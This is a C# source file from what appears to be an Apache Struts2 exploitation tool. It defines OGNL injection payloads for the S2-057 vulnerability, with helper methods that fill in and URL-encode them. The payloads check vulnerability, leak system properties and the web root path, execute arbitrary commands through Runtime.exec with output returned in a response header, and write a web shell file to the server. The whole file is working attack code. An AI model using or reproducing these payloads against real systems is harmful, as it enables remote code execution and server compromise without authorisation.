using System;
using System.Collections.Generic;
using System.Text;
using System.Web;

namespace payload
{
    public class S2057 : BasePayload
    {
        private String Exp_Check = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('eresult','struts2_security_check'))}";
        private String Exp_VerInfo = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('[vername]',@java.lang.System@getProperty('[vername]')))}";
        private String Exp_Path = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#p=#req.getSession().getServletContext().getRealPath('/')).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('webpath',#p))}";
        private String Exp_Exec = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#str=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('[cmd]').getInputStream())).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('cmd',#str))}";
        private String Exp_Upload_Path = "${%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=[path]&shellContent=[filecontent]&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f";

        public String Get_Exp_Check()
        {
            return HttpUtility.UrlEncode(this.Exp_Check);
        }
        public String Get_Exp_VerInfo(String vername)
        {
            return HttpUtility.UrlEncode(this.Exp_VerInfo.Replace("[vername]", vername)); ;
        }
        public String Get_Exp_Path()
        {
            return HttpUtility.UrlEncode(this.Exp_Path).Replace("%2f","/");
        }
        public String Get_Exp_Exec(String cmd)
        {
            return HttpUtility.UrlEncode(this.Exp_Exec.Replace("[cmd]", cmd)).Replace("+","%20");
        }
        public String Get_Exp_Upload(String path, String fileName, String fileContent)
        {
            /*
            if ("".Equals(path))
            {
                this.Exp_Upload = this.Exp_Upload.Replace("[filename]", fileName);
            }
            else
            {
                this.Exp_Upload_Path = this.Exp_Upload_Path.Replace("[path]", path);
            }
            return this.Exp_Upload.Replace("[filecontent]", fileContent);
            */
            return "";
        }


    }
}
